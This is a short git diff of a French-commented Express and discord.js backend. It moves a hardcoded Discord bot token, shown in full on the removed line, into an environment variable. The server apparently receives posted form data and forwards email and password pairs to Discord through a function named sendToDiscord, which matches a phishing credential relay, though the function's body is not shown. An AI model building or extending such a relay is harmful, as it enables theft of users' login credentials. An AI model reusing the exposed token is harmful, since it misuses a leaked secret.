@@ -1,3 +1,4 @@
+require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 
@@ -7,7 +8,7 @@ const port = process.env.PORT || 3000; // Utilisez le port fourni par Heroku, ou
 const { Client, GatewayIntentBits, EmbedBuilder, Partials } = require('discord.js');
 
 const discordBot = new Client({ intents: [GatewayIntentBits.Guilds], partials: [Partials.Channel] });
-discordBot.login('MTIxMTA0MTY2NTY0OTg3NzAzMg.GBWF2P.hGi-V_eeYPABXiRck5AZ5LRyTzNtLnR6JI7aDQ');
+discordBot.login(process.env.DISCORD_BOT_TOKEN);
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
@@ -51,3 +52,4 @@ function sendToDiscord(email, password) {
 app.listen(port, () => {
     console.log(`Serveur backend en cours d'exécution sur le port ${port}`);
 });
+
